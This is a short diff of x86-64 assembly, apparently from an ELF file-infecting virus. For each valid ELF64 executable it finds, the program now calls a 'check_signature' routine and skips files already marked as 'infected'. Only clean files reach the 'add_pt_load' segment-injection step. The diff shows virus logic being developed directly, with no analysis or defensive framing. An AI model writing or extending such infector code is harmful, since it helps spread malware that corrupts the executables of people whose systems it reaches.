@@ -93,7 +93,15 @@ check_elf64_exec:
     lea rdi, [rel msg_valid]
     call print_string
 
-    ; Call add_pt_load for this valid ELF64 executable
+    ; Check if the file is infected
+    mov rdi, r15                ; pass the file path
+    call check_signature        ; returns 0 if not infected, 1 if infected
+
+    ; Only call add_pt_load if file is NOT infected
+    test rax, rax
+    jnz .next_file              ; skip if infected (rax != 0)
+
+    ; Call add_pt_load for this non-infected ELF64 executable
     mov rdi, r15                ; pass the file path
     call add_pt_load
 
